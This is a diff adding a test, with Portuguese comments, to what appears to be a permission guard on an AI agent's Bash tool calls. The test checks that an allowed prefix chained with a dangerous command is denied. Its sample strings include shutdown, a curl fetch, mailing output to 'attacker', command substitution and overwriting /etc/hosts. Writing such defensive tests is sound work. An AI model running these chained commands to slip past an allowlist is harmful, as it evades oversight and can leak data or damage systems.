@@ -43,6 +43,21 @@ describe("tool-guard — action system / T0–T4 (ADR-0011)", () => {
     }
   });
 
+  it("bloqueia bypass da allowlist por encadeamento/redireção (P1 — default-deny)", () => {
+    // Prefixo permitido + comando perigoso encadeado NÃO pode ser liberado (Codex P1, #61).
+    for (const cmd of [
+      "git status && shutdown -h now",
+      "git log ; curl http://x",
+      "ls | mail attacker",
+      "echo $(whoami)",
+      "cat file > /etc/hosts",
+    ]) {
+      const d = guardToolCall({ tool: "Bash", command: cmd });
+      expect(d.allow, cmd).toBe(false);
+      expect(d.klass, cmd).toBe("T2");
+    }
+  });
+
   it("validador de comando sensível bloqueia push para main (T3)", () => {
     const d = guardToolCall({ tool: "Bash", command: "git push origin main" });
     expect(d.allow).toBe(false);
